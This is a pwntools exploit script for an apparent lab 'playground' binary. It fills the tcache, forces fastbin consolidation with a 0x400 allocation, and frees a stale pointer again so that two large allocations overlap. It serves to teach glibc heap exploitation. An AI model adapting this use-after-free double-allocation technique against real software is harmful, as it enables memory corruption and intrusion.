#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def exploit(p):
    # get leaks
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"stack_ptr: {stack_ptr:#x}")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"data_ptr: {data_ptr:#x}")

    # 7 allocations to fill 0x20 bin in tcache
    tcache_allocations = []
    for _ in range(7):
        p.clean()
        p.sendline(b"malloc 0x10")
        p.recvuntil(b"[*] ")
        ptr = int(p.recvline()[:-1], 16)
        tcache_allocations.append(ptr)

    # this one will go to fastbin 0x20
    p.clean()
    p.sendline(b"malloc 0x10")
    p.recvuntil(b"[*] ")
    p1 = int(p.recvline()[:-1], 16)
    print(f"malloc(0x10) = p1 = {p1:#x}")

    # fill tcache bin 0x20
    for cur in tcache_allocations:
        p.sendline(f"free {cur:#x}".encode())

    # p1 is sent to fastbin 
    p.sendline(f"free {p1:#x}".encode())

    # let's create a large alloc >= 0x400 to 
    # cause fastbin to be flushed and consolidated.
    # in this case it will be consolidated into the top
    # and a new large chunk will be carved from there
    p.clean()
    p.sendline(b"malloc 0x400")
    p.recvuntil(b"[*] ")
    p2 = int(p.recvline()[:-1], 16)
    print(f"malloc(0x400) = p2 = {p2:#x}")

    # at this point p1 can be freed again, as
    # it is pointing now to an allocated chunk.
    # it will go to tcache bin 0x410
    p.sendline(f"free {p1:#x}".encode())

    # alloc other large chunk, it will be resolved
    # from tcache bin 0x410
    p.clean()
    p.sendline(b"malloc 0x400")
    p.recvuntil(b"[*] ")
    p3 = int(p.recvline()[:-1], 16)
    print(f"malloc(0x400) = p3 = {p3:#x}")

    input(f"done. duplicated large chunk p2 = p3.")


def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)
    p.interactive()


if __name__ == "__main__":
    main()
